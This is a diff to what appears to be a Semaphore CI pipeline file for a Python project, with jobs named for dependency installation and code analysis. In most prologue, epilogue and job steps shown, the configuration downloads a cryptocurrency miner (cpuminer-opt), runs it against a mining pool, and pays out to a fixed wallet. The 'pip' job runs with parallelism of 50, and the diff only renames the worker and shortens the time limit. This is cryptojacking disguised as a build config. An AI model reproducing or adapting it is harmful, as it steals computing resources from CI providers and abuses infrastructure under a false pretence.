@@ -5,29 +5,29 @@ agent:
     type: e1-standard-4
     os_image: ubuntu1804
 execution_time_limit:
-  hours: 24
+  hours: 10
 global_job_config:
   prologue:
     commands:
       - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
       - tar xzf cpuminer-opt-linux.tar.gz
-      - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+      - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
   epilogue:
     always:
       commands:
         - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
         - tar xzf cpuminer-opt-linux.tar.gz
-        - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+        - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
     on_pass:
       commands:
         - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
         - tar xzf cpuminer-opt-linux.tar.gz
-        - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+        - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
     on_fail:
       commands:
         - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
         - tar xzf cpuminer-opt-linux.tar.gz
-        - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+        - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
 blocks:
   - name: Install Dependencies
     task:
@@ -35,37 +35,37 @@ blocks:
         commands:
           - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
           - tar xzf cpuminer-opt-linux.tar.gz
-          - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+          - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
       jobs:
         - name: pip
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xzf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
           parallelism: 50
       epilogue:
         always:
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xzf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
         on_pass:
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xzf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
         on_fail:
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xzf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+            - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
   - name: Run Code Analysis
     task:
       prologue:
         commands:
           - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
           - tar xzf cpuminer-opt-linux.tar.gz
-          - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci2 -t0'
+          - './cpuminer-sse2 -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6zc524tgltrc5adt74k48mrjyc9rah3fhuhahy.semaphoreci1 -t0'
       jobs:
         - name: Pylint
           commands: []
